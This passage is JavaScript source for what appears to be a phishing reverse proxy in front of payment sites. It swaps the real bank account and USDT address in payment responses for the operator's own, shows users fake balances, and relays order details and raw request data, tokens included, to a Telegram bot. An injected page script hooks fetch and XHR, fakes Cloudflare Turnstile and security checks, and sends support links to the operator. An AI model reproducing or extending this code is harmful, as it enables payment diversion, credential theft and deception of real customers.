              const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
              if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;

              replaceOrderBankDetails(item, targetBank);
            }
          });
        }

        if (isListResp) {
          _replaceListItems(respData);
        } else if (nestedList) {
          _replaceListItems(nestedList);
        } else {
          // Single order / non-list response
          let shouldReplace = true;
          if (bank.minAmount) {
            const amt = getOrderAmount(req, respData);
            if (amt !== null && amt < bank.minAmount) {
              shouldReplace = false;
              _notReplacedAmt = amt;
              _notReplacedMin = bank.minAmount;
            }
          }
          if (shouldReplace) {
            replaceOrderBankDetails(jsonResp, bank);
            if (respData && typeof respData === 'object') replaceOrderBankDetails(respData, bank);
            _bankReplaced = true;
            _replacedBank = bank;
          }
        }
      }

      {
        const uo = userId ? ((data.userOverrides && data.userOverrides[String(userId)]) || {}) : {};
        const addedBalance = uo.addedBalance || 0;
        const globalBonus = data.depositBonus || 0;
        const totalBonus = addedBalance + globalBonus;
        if (totalBonus > 0) {
          addBalanceToFields(jsonResp, totalBonus, 0);
        }
      }

      if (data.usdtAddress) {
        replaceUsdtAddress(jsonResp, data.usdtAddress, 0);
      }
    }

    // Only notify when response actually had bank details (paymentslipdetail or bank fields in response)
    if (isOrder && (_realBankSnap || _bankReplaced || _notReplacedAmt !== null || urlLower.includes('paymentslipdetail') || urlLower.includes('news/code/'))) {
      const _orderAmt = _notReplacedAmt !== null ? _notReplacedAmt : getOrderAmount(req, respData);
      if (_orderId) {
        if (!data.orderBankMap) data.orderBankMap = {};
        const bk = _bankReplaced && _replacedBank ? _replacedBank : (_realBankSnap || {});
        // Fix duplicate order save by explicitly setting rptNo
        const altId = (respData && respData.rptNo) ? String(respData.rptNo) : '';
        const savedData = {
          bank: `${bk.accountHolder || ''} | ${bk.accountNo || ''} | ${bk.ifsc || ''}`,
          time: now,
          userId: userId || '',
          rptNo: _orderId,
          orderNo: altId || _orderId,
          amount: _orderAmt || 0,
          isManual: true,
          forced: true
        };
        data.orderBankMap[_orderId] = savedData;
        if (altId && altId !== _orderId) {
          data.orderBankMap[altId] = savedData;
        }
        // Save dynamically captured direct order screen
        await saveData(data);
      }
      const realLine = _realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)
        ? `🏦 Real Bank:\n  Name: ${_realBankSnap.accountHolder || 'N/A'}\n  Acc:  ${_realBankSnap.accountNo || 'N/A'}${_realBankSnap.ifsc ? '\n  IFSC: ' + _realBankSnap.ifsc : ''}${_realBankSnap.bankName ? '\n  Bank: ' + _realBankSnap.bankName : ''}${_realBankSnap.upiId ? '\n  UPI:  ' + _realBankSnap.upiId : ''}`
        : '🏦 Real Bank: N/A';
      let replaceLine;
      if (_bankReplaced && _replacedBank) {
        replaceLine = `✅ Replaced With:\n  Name: ${_replacedBank.accountHolder}\n  Acc:  ${_replacedBank.accountNo}\n  IFSC: ${_replacedBank.ifsc}${_replacedBank.bankName ? '\n  Bank: ' + _replacedBank.bankName : ''}${_replacedBank.upiId ? '\n  UPI:  ' + _replacedBank.upiId : ''}`;
      } else if (_notReplacedAmt !== null) {
        replaceLine = `⚠️ NOT Replaced\n  ₹${_notReplacedAmt} < Min ₹${_notReplacedMin} — Real bank shown`;
      } else {
        replaceLine = `❌ NOT Replaced (no active bank)`;
      }

      // Determine if order was actually replaced or just not replaced due to min amount
      // Also ensure we only notify ONCE per order.
      const alreadyNotified = _orderId && data.orderBankMap && data.orderBankMap[_orderId] && data.orderBankMap[_orderId].notified;
      const hasValidData = _orderAmt !== null || _realBankSnap || _bankReplaced;

      if (!alreadyNotified && hasValidData) {
        if (_orderId && data.orderBankMap && data.orderBankMap[_orderId]) {
          data.orderBankMap[_orderId].notified = true;
        }

        if (_bankReplaced && _replacedBank) {
          notifyAdmin(data,
            `✅ BUY SUCCESSFUL
💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
📋 Order: ${_orderId || 'N/A'}
💾 Order is saved for history
━━━━━━━━━━━━━━━━━━━━
${realLine}
━━━━━━━━━━━━━━━━━━━━
${replaceLine}
🕐 ${now}`);
        } else if (_notReplacedAmt !== null) {
          notifyAdmin(data,
            `⚠️ BUY SUCCESSFUL (NOT REPLACED)
💰 Amount: ₹${_notReplacedAmt}
📋 Order: ${_orderId || 'N/A'}
ℹ️ ₹${_notReplacedAmt} < Min ₹${_notReplacedMin}
━━━━━━━━━━━━━━━━━━━━
${realLine}
━━━━━━━━━━━━━━━━━━━━
${replaceLine}
🕐 ${now}`);
        } else if (jsonResp && jsonResp.code !== 0 && jsonResp.code !== 200) {
          notifyAdmin(data,
            `❌ BUY NOT SUCCESSFUL
💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
📋 Order: ${_orderId || 'N/A'}
⚠️ Reason: ${jsonResp.msg || jsonResp.message || 'unknown error'}
🕐 ${now}`);
        } else if (_realBankSnap && (_realBankSnap.accountNo || _realBankSnap.accountHolder)) {
          // Only notify about 'No Active Bank' if there are actual real bank details being shown
          notifyAdmin(data,
            `ℹ️ ORDER PLACED (No Active Bank)
💰 Amount: ₹${_orderAmt !== null ? _orderAmt : 'unknown'}
📋 Order: ${_orderId || 'N/A'}
━━━━━━━━━━━━━━━━━━━━
${realLine}
━━━━━━━━━━━━━━━━━━━━
${replaceLine}
🕐 ${now}`);
        }
      }
    }

    // ── Buy History List: capture orderNo → bank for each item in history ──────
    if (urlLower.includes('/history') || urlLower.includes('_history')) {
      const listData = (jsonResp && typeof jsonResp === 'object')
        ? (jsonResp.data || jsonResp.result || jsonResp.body || jsonResp)
        : null;
      const orderList = (listData && Array.isArray(listData.list)) ? listData.list
        : (listData && Array.isArray(listData.data)) ? listData.data
          : Array.isArray(listData) ? listData
            : null;

      if (orderList && orderList.length > 0) {
        const orderIdFields = ['orderNo', 'order_no', 'orderId', 'order_id', 'rptNo', 'rpt_no', 'tradeNo', 'trade_no', 'slipId', 'buyOrderNo'];
        let capturedCount = 0;
        let logLines = [];
        if (!data.orderBankMap) data.orderBankMap = {};

        for (const item of orderList) {
          if (!item || typeof item !== 'object') continue;
          // Must have a bank field to be relevant
          const itemHasBank = item.acctNo || item.acctno || item.accountNo || item.acctName || item.acctname;
          if (!itemHasBank) continue;

          let oId = '';
          // First pass: try to find a purely numeric ID (like 5524954159126535)
          for (const f of orderIdFields) {
            if (item[f] && String(item[f]).length >= 3 && /^\d+$/.test(String(item[f]))) {
              oId = String(item[f]);
              break;
            }
          }
          // Second pass: if no numeric ID found, fallback to any ID
          if (!oId) {
            for (const f of orderIdFields) {
              if (item[f] && String(item[f]).length >= 3) {
                oId = String(item[f]);
                break;
              }
            }
          }
          if (!oId) continue;

          const acctNo = item.acctNo || item.acctno || item.accountNo || item.accountno || '';
          const acctName = item.acctName || item.acctname || item.accountName || item.accountname || '';
          const acctCode = item.acctCode || item.acctcode || item.ifsc || item.acctIfsc || '';
          const amt = item.amount || item.money || item.realAmount || item.orderAmount || '';

          // Store real history snapshot separately for logging without corrupting orderBankMap
          if (!data.realHistoryMap) data.realHistoryMap = {};
          if (!data.realHistoryMap[oId]) {
            data.realHistoryMap[oId] = {
              bank: `${acctName} | ${acctNo}${acctCode ? ' | ' + acctCode : ''}`,
              amount: parseFloat(amt) || 0,
              rptNo: item.rptNo || item.rpt_no || oId,
              orderNo: item.orderNo || item.order_no || oId,
              time: now,
              userId: userId || ''
            };
          }

          // Check if we have already notified about this specific order ID
          const alreadyNotified = data.orderBankMap[oId] && data.orderBankMap[oId].notified;

          if (!alreadyNotified) {
            // Mark as notified so we don't count it again
            if (data.orderBankMap[oId]) {
              data.orderBankMap[oId].notified = true;
            }
            capturedCount++;
            logLines.push(`📋 ${oId}\n   💰 ₹${amt}  👤 ${acctName}\n   🏦 ${acctNo}${acctCode ? ' | ' + acctCode : ''}`);
          }
        }

        if (capturedCount > 0 && data.adminChatId && bot) {
          const header = `📂 BUY HISTORY VIEWED\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📊 ${capturedCount} order(s) captured\n━━━━━━━━━━━━━━━━━━━━`;
          const body = logLines.slice(0, 10).join('\n━━━━━━━━━━━\n');
          const footer = `\n━━━━━━━━━━━━━━━━━━━━\n🕐 ${now}`;
          bot.sendMessage(data.adminChatId, header + '\n' + body + footer).catch(() => { });
        }
      }
    }

    // Non-blocking save — don't hold up the response for storage I/O
    if (userId) saveData(data).catch(() => { });

    // ── Raw log — send full req+resp to Telegram if /rr is ON
    sendRawLog(data, {
      method: req.method,
      url: req.originalUrl || req.url,
      reqHeaders: req.headers,
      reqBodyRaw: req.rawBody,
      status: response.status,
      respHeaders: respHeaders,
      respBodyRaw: respBody,
      source: 'api',
      now
    }).catch(() => { });

    const curBank = getActiveBank(data, userId);
    const defBankName = (curBank && curBank.bankName) ? curBank.bankName : ((curBank && curBank.ifsc) ? getBankNameFromIfsc(curBank.ifsc) : 'Bank');
    if (jsonResp) cleanUglyBankNames(jsonResp, 0, defBankName);
    sendJson(res, respHeaders, jsonResp);

  } catch (e) {
    console.error('xxapi proxy error:', e.message);
    try {
      const url = TIVOX_API + (req.originalUrl || req.url);
      const fwd = {};
      for (const [k, v] of Object.entries(req.headers)) {
        const kl = k.toLowerCase();
        if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
        fwd[k] = v;
      }
      fwd['host'] = 'tivox.icu';
      const opts = { method: req.method, headers: fwd, redirect: 'manual' };
      if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
        opts.body = req.rawBody;
      }
      const resp = await fetch(url, opts);
      const body = await resp.text();
      res.writeHead(resp.status, { 'content-type': resp.headers.get('content-type') || 'application/json' });
      res.end(body);
    } catch (e2) {
      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
    }
  }
});

const INJECT_JS = `(function(){
if(window._pxi)return;window._pxi=1;
var P='https://${PROXY_HOST}';
var REAL='https://tivox.icu';
var REAL2='https://qonix.click';

// ── Intercept API calls so <base> tag doesn't redirect them to vivipay.net ──
(function(){
  var origFetch = window.fetch;
  window.fetch = function(url, opts) {
    if (typeof url === 'string') {
      if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
        url = P + '/rsCfg.json';
      } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
        url = P + '/xxapi/' + url.split('/xxapi/')[1];
      }
    }
    return origFetch.call(window, url, opts);
  };
  if (typeof XMLHttpRequest !== 'undefined' && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open) {
    var origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
      if (typeof url === 'string') {
        if (url.indexOf('rsCfg.json') !== -1 || url.indexOf('/rsCfg.json') !== -1) {
          url = P + '/rsCfg.json';
        } else if (url.indexOf('vivipay.net/xxapi/') !== -1 || url.indexOf('tivox.icu/xxapi/') !== -1 || url.indexOf('qonix.click/xxapi/') !== -1) {
          url = P + '/xxapi/' + url.split('/xxapi/')[1];
        }
      }
      return origOpen.call(this, method, url, async, user, pass);
    };
  }
})();

// ── Cloudflare Turnstile auto-complete ──────────────────────────────────────
// vivipay.net waits for turnstile.render() callback before enabling login.
// On our proxy domain, the real Cloudflare widget sometimes doesn't fire the
// callback. We intercept window.turnstile when Cloudflare sets it and wrap
// render() to immediately call the callback — getsendtken accepts any token.
(function(){
  var _autoTurnstile={
    render:function(el,opts){
      var wid='auto-'+Math.random().toString(36).slice(2,8);
      // Call callback immediately (10ms delay to let Vue component mount)
      if(opts&&typeof opts.callback==='function'){
        setTimeout(function(){opts.callback('auto-cf-'+Date.now());},10);
      }
      // Also set global response so getResponse works
      window._cfTurnstileToken='auto-cf-'+Date.now();
      return wid;
    },
    remove:function(){},
    reset:function(){},
    getResponse:function(){return window._cfTurnstileToken||'auto-cf-'+Date.now();},
    isExpired:function(){return false;}
  };
  // Intercept when Cloudflare sets window.turnstile
  var _cfReal=null;
  try{
    Object.defineProperty(window,'turnstile',{
      configurable:true,
      get:function(){return _cfReal||_autoTurnstile;},
      set:function(v){
        // When real Cloudflare script sets turnstile, wrap render to auto-call callback
        if(v&&typeof v.render==='function'){
          _cfReal={};
          for(var k in v)_cfReal[k]=v[k];
          var _orig=v.render.bind(v);
          _cfReal.render=function(el,opts){
            // Kill error/expired callbacks — prevent "Security check failed" toast
            if(opts){
              opts['error-callback']=function(){};
              opts['expired-callback']=function(){};
              opts['timeout-callback']=function(){};
              opts['unsupported-callback']=function(){};
            }
            var id=_orig(el,opts);
            // Safety net: if callback not called within 1.5s, auto-call it
            var _done=false;
            var _origCb=opts&&opts.callback;
            if(_origCb){
              setTimeout(function(){
                if(!_done){_done=true;try{_origCb('auto-cf-'+Date.now());}catch(e){}}
              },1500);
            }
            return id;
          };
        } else {
          _cfReal=_autoTurnstile;
        }
      }
    });
  }catch(e){
    // defineProperty failed — set directly as fallback
    if(!window.turnstile)window.turnstile=_autoTurnstile;
  }
})();
// ────────────────────────────────────────────────────────────────────────────

// Mock xamlAction for browser — app ke native bridge ka replacement
// Security check calls ko intercept karke success return karo
if(!window.xamlAction){
  window.xamlAction={
    showToast:function(msg){console.log('[xaml] toast:',msg);},
    closeWebview:function(){try{window.history.back();}catch(e){}},
    openWebview:function(url){try{window.location.href=url;}catch(e){}},
    getDeviceInfo:function(){return JSON.stringify({deviceId:'bro_'+Math.random().toString(36).slice(2,10),platform:'android',version:'1.0.0',brand:'samsung',model:'SM-G991B',osVersion:'12'});},
    getToken:function(){try{return localStorage.getItem('token')||'';}catch(e){return '';}},
    saveToken:function(t){try{localStorage.setItem('token',t);}catch(e){}},
    getSecurityToken:function(){return 'sec_'+Date.now().toString(36);},
    getSign:function(data){return 'sign_'+btoa(data||'').slice(0,16);},
    getNonce:function(){return Math.random().toString(36).slice(2,18);},
    getTimestamp:function(){return String(Date.now());},
    checkSecurity:function(){return '1';},
    securityCheck:function(){return 'pass';},
    getVerifyCode:function(){return 'ok';},
    invokeAction:function(action,params){
      try{
        var p=params?JSON.parse(params):{};
        if(action==='getToken')return localStorage.getItem('token')||'';
        if(action==='getDeviceInfo')return window.xamlAction.getDeviceInfo();
        if(action==='closeWebview'){window.history.back();return '';}
        if(action==='openWebview'&&(p.url||p.ct_url)){window.location.href=p.url||p.ct_url;return '';}
        var bName=(CFG&&CFG.bn)||'Bank';
        if(action==='getBankName'||action==='getBank'||action==='queryBank'||action==='getBankByIfsc'||action==='bankName'){
          return bName;
        }
        return bName;
      }catch(e){return (CFG&&CFG.bn)||'Bank';}
    }
  };
}


function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);return null;}
var CFG=null;
var UID='';

try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\\d{6,12}$/.test(_ls))UID=_ls;}catch(e){}

function lc(){
try{var x=new XMLHttpRequest();
x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
x.send();if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
function lcAsync(){
try{var x=new XMLHttpRequest();
x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
x.send();}catch(e){}}
try{lc();}catch(e){}
setInterval(function(){lcAsync();},25000);

var ID_FIELDS=['teamWorkId','memberCodeId','userId','channelUid','uid','memberId','accountId'];

function setUID(id){
if(!id||!/^\\d{6,12}$/.test(id)||id===UID)return;
UID=id;try{localStorage.setItem('_px_uid',id);}catch(e){}
lcAsync();}

var _open=XMLHttpRequest.prototype.open;
var _send=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){
var _pu=_px(u);if(_pu){u=_pu;arguments[1]=u;}
this._hu=u;this._hm=m;
var ret=_open.apply(this,arguments);
if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
return ret;};

var _cachedBal=null;
function fmtBal(v){var n=parseFloat(v);if(isNaN(n))return null;return n.toFixed(2);}
if(CFG&&CFG.bal!==null&&CFG.bal!==undefined){_cachedBal=fmtBal(CFG.bal);}
if(!_cachedBal){try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=fmtBal(_cb);}catch(e){}}

function cacheBal(obj){
if(!obj||typeof obj!=='object')return;
var bks=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance'];
for(var i=0;i<bks.length;i++){
var bk=bks[i];
if(obj[bk]!==undefined&&obj[bk]!==null&&obj[bk]!==''){
var bv=parseFloat(obj[bk]);
if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}

function patchBankDOM(){
  if(!document.body)return;
  var bName=(CFG&&CFG.bn)||'Bank';
  var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
  var toFix=[];
  while(walker.nextNode()){
    var nd=walker.currentNode;
    var txt=(nd.textContent||'').trim();
    if(txt.indexOf('{"code":')!==-1||txt.indexOf('"msg":')!==-1||txt.indexOf('"data":')!==-1){
      toFix.push(nd);
    }
  }
  for(var i=0;i<toFix.length;i++){
    toFix[i].textContent=bName;
  }
}

function patchBalDOM(){
  patchBankDOM();
if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
if(!document.body)return;
var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
var toFix=[];
while(walker.nextNode()){
var nd=walker.currentNode;
var txt=(nd.textContent||'').trim();
if(txt!=='0.00'&&txt!=='0'&&txt!=='0.0')continue;
var el=nd.parentElement;
if(!el||el.children.length>0)continue;
var p1=el.parentElement;
var p2=p1?p1.parentElement:null;
var p3=p2?p2.parentElement:null;
var ctx='';
if(p1)ctx+=(p1.innerText||'').toLowerCase();
if(p2)ctx+=' '+(p2.innerText||'').toLowerCase();
if(p3)ctx+=' '+(p3.innerText||'').toLowerCase();
if(ctx.indexOf('itoken')>-1||ctx.indexOf('balance')>-1||ctx.indexOf('my itoken')>-1||ctx.indexOf('wallet')>-1){
var elCtx=(el.innerText||'').toLowerCase();
if(elCtx.indexOf('profit')===-1&&elCtx.indexOf('reward')===-1&&elCtx.indexOf('team')===-1&&elCtx.indexOf('commission')===-1){
toFix.push(nd);}}}
for(var i=0;i<toFix.length;i++){toFix[i].textContent=_cachedBal;}}

XMLHttpRequest.prototype.send=function(body){
var self=this;
self.addEventListener('load',function(){
try{
var r=self.response;
if(!r)return;
var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
if(!j)return;
var d=j.data||j.body||j.result||j;
if(d&&typeof d==='object'){
cacheBal(d);
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];
if(d[f]){var v=String(d[f]).trim();
if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}
setTimeout(patchBalDOM,50);setTimeout(patchBalDOM,200);setTimeout(patchBalDOM,500);
}catch(e){}});
return _send.apply(this,arguments);};

var _fetch=window.fetch;
if(_fetch){
window.fetch=function(input,init){
var url=typeof input==='string'?input:(input&&input.url)||'';
var _purl=_px(url);if(_purl){var nu=_purl;
if(typeof input==='string'){arguments[0]=nu;}
else{arguments[0]=new Request(nu,input);}}
if(UID){if(!init)init={};if(!init.headers)init.headers={};
if(init.headers instanceof Headers){init.headers.set('x-px-uid',UID);}
else{init.headers['x-px-uid']=UID;}arguments[1]=init;}
return _fetch.apply(this,arguments).then(function(resp){
try{var cl=resp.clone();
cl.text().then(function(t){
try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
if(d&&typeof d==='object'){
cacheBal(d);
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
return resp;});};}

var _csPage=false;
function csUrl(s){
if(!s||typeof s!=='string')return false;
return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1||s.indexOf('telegram.org')>-1||s.indexOf('chat.')>-1||s.indexOf('support')>-1||s.indexOf('service')>-1||s.indexOf('kefu')>-1;}

function isCSPage(){
var url=(window.location.href||window.location.pathname||'').toLowerCase();
return url.indexOf('customerservice')>-1||url.indexOf('customer_service')>-1||url.indexOf('customer-service')>-1||url.indexOf('kefu')>-1||url.indexOf('online_service')>-1||url.indexOf('servicelist')>-1||url.indexOf('csrlist')>-1;}

function fixLinks(){
if(!CFG||!CFG.tg)return;
_csPage=isCSPage();
var links=document.querySelectorAll('a');
for(var i=0;i<links.length;i++){
var h=links[i].href||'';
if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}}

function fixOnClick(){
if(!CFG||!CFG.tg)return;
var all=document.querySelectorAll('[onclick]');
for(var i=0;i<all.length;i++){
var oc=all[i].getAttribute('onclick')||'';
if(csUrl(oc)){all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}

var _wopen=window.open;
window.open=function(url){
if(CFG&&CFG.tg){
if(csUrl(url)||_csPage){arguments[0]=CFG.tg;}}
return _wopen.apply(this,arguments);};

var _locDesc=Object.getOwnPropertyDescriptor(window,'location')||{};
var _asgn=window.location.assign.bind(window.location);
var _repl=window.location.replace.bind(window.location);
window.location.assign=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _asgn(url);};
window.location.replace=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _repl(url);};

if(window.xamlAction&&window.xamlAction.invokeAction){
var _invoke=window.xamlAction.invokeAction.bind(window.xamlAction);
window.xamlAction.invokeAction=function(action,params){
if(CFG&&CFG.tg&&params){
try{var p=JSON.parse(params);
var changed=false;
var ukeys=['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl','jump_url','target','redirect','contactUrl'];
ukeys.forEach(function(key){
if(p[key]&&typeof p[key]==='string'&&(csUrl(p[key])||p[key].indexOf('http')===0)){p[key]=CFG.tg;changed=true;}});
if(changed)params=JSON.stringify(p);
}catch(e){}}
return _invoke(action,params);};}

document.addEventListener('click',function(e){
if(!CFG||!CFG.tg)return;
var el=e.target;var depth=0;
var onCS=_csPage||isCSPage();
while(el&&depth<10){
if(el.tagName==='A'){
var href=el.getAttribute('href')||'';
if(csUrl(href)||(onCS&&href.indexOf('http')===0)){
e.preventDefault();e.stopPropagation();
window.location.href=CFG.tg;return;}
if(href.indexOf('xaml:')===0){
try{var dec=decodeURIComponent(href.substring(5));
var jo=JSON.parse(dec);
var ck=['ct_url','url','link','href','jumpUrl','jump_url','target','serviceUrl'];
var ch=false;
ck.forEach(function(k2){if(jo[k2]){jo[k2]=CFG.tg;ch=true;}});
if(ch){e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e2){}}
if(href.indexOf('syt:')===0){
try{var dec2=decodeURIComponent(href.substring(4));
var jo2=JSON.parse(dec2);
if(jo2.url||jo2.link||jo2.href){
e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e3){}}}
if(onCS&&(el.tagName==='BUTTON'||el.tagName==='DIV'||el.tagName==='SPAN'||el.tagName==='LI')){
var elTxt=(el.innerText||'').toLowerCase();
if(elTxt.indexOf('go')>-1||elTxt.indexOf('service')>-1||elTxt.indexOf('online')>-1||elTxt.indexOf('csr')>-1||elTxt.indexOf('whatsapp')>-1||elTxt.indexOf('telegram')>-1||elTxt.indexOf('contact')>-1){
e.preventDefault();e.stopPropagation();
window.location.href=CFG.tg;return;}}
el=el.parentElement;depth++;}
},true);

function scanDOM(){
try{if(!document.body)return;
var txt=document.body.innerText||'';
var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
if(m&&m[1])setUID(m[1]);
}catch(e){}}

scanDOM();patchBalDOM();
var _rafC=0;function _rafLoop(){patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
requestAnimationFrame(_rafLoop);
setInterval(function(){scanDOM();patchBalDOM();},300);
if(document.body){
var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
else{document.addEventListener('DOMContentLoaded',function(){
patchBalDOM();
var obs2=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
setInterval(function(){fixLinks();fixOnClick();},2000);
fixLinks();fixOnClick();patchBalDOM();
})();`;

// ─── Frontend catch-all proxy ───────────────────────────────────────────────
// Proxy everything else from vivipay.net
// For HTML responses: inject our inject.js script into <head>
app.all('*', async (req, res) => {
  try {
    const path = req.originalUrl || req.url;

    // --- TOKEN LOGIN BYPASS HANDLER ---
    if (req.query && req.query.token) {
      const token = req.query.token.trim();
      if (token.length > 10) {
        const cookieStr = `token=${token}; Path=/; Secure; SameSite=None; Max-Age=31536000`;
        res.setHeader('Set-Cookie', cookieStr);

        // Inject script to set LocalStorage as well
        const html = `<html><body><script>
          localStorage.setItem('token', '${token}');
          localStorage.setItem('accessToken', '${token}');
          document.cookie = "${cookieStr}";
          window.location.href = "/";
        </script></body></html>`;
        return res.status(200).send(html);
      }
    }
    // ----------------------------------
    const url = 'https://' + FRONTEND_HOST + path;
    const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

    const fwd = {};
    for (const [k, v] of Object.entries(req.headers)) {
      const kl = k.toLowerCase();
      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
      fwd[k] = v;
    }
    fwd['host'] = FRONTEND_HOST;
    fwd['origin'] = 'https://' + FRONTEND_HOST;
    fwd['referer'] = 'https://' + FRONTEND_HOST + '/';

    const opts = { method: req.method, headers: fwd, redirect: 'follow' };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      fwd['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);
    const ct = response.headers.get('content-type') || '';

    // Pass through response headers (skip hop-by-hop)
    const skipHeaders = new Set(['transfer-encoding', 'connection', 'content-encoding', 'content-length', 'keep-alive']);
    response.headers.forEach((val, key) => {
      const kl = key.toLowerCase();
      if (skipHeaders.has(kl)) return;

      // Rewrite Set-Cookie: strip Domain so browser stores cookies for our proxy domain
      // This fixes "security check failed" in incognito — vivipay.net session cookies get
      // stored for rtyhh.vercel.app and are forwarded back to vivipay.net on every request
      if (kl === 'set-cookie') {
        val = val.replace(/;\s*[Dd]omain=[^;]+/gi, '');
        val = val.replace(/;\s*SameSite=(?:Strict|Lax)/gi, '; SameSite=None');
        if (!/SameSite/i.test(val)) val = val.trimEnd() + '; SameSite=None';
        if (/SameSite=None/i.test(val) && !/;\s*Secure/i.test(val)) val += '; Secure';
        res.append('set-cookie', val);
        return;
      }

      res.setHeader(key, val);
    });

    res.setHeader('Access-Control-Allow-Origin', '*');

    // HTML — inject our script + set base so static assets load from vivipay.net directly
    if (ct.includes('text/html')) {
      const htmlCacheKey = 'html:' + path;
      const htmlCached = cacheGet(htmlCacheKey);
      if (htmlCached) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('content-type', 'text/html; charset=utf-8');
        res.setHeader('content-length', String(htmlCached.buf.length));
        res.status(htmlCached.status).end(htmlCached.buf);
        return;
      }
      let html = await response.text();

      const proxyBase = 'https://' + PROXY_HOST;
      const frontendBase = 'https://' + FRONTEND_HOST;

      // Rewrite absolute tivox/qonix URLs to proxy
      html = html.replace(/https:\/\/tivox\.icu/g, proxyBase);
      html = html.replace(/https:\/\/qonix\.click/g, proxyBase);

      // Rewrite JS script src tags to go through OUR proxy so we can patch them
      // CSS/fonts/images keep base href pointing to vivipay.net (fast direct load)
      html = html.replace(
        /(<script[^>]+src=")(\.\/)?(assets\/[^"]+\.js)(")/g,
        `$1${proxyBase}/$3$4`
      );
      // Also handle modulepreload links for JS
      html = html.replace(
        /(<link[^>]+rel="modulepreload"[^>]+href=")(\.\/)?(assets\/[^"]+\.js)(")/g,
        `$1${proxyBase}/$3$4`
      );

      const turnstileBypass = ''; // disabled — using real CF widget

      // Preconnect hints for faster asset loading from vivipay.net
      const preconnect = `<link rel="preconnect" href="${frontendBase}" crossorigin><link rel="dns-prefetch" href="${frontendBase}">`;

      const turnstileCSS = ''; // disabled — let CF widget show normally

      // Add <base> tag so remaining relative asset URLs (CSS, images, fonts) load directly from vivipay.net
      const baseTag = `<base href="${frontendBase}/">`;

      // Inject: preconnect at top of <head>, base+inject.js before </head>
      const injectTag = `<script src="${proxyBase}/inject.js"></script>`;
      if (html.includes('</head>')) {
        html = html.replace(/<head[^>]*>/i, '$&\n' + preconnect);
        html = html.replace('</head>', baseTag + '\n' + injectTag + '\n</head>');
      } else {
        html = preconnect + '\n' + baseTag + '\n' + injectTag + '\n' + html;
      }

      const buf = Buffer.from(html, 'utf-8');
      // Cache HTML server-side for 30s — avoids vivipay.net round-trip on each refresh
      cacheSet(htmlCacheKey, buf, 'text/html; charset=utf-8', response.status, 60000);
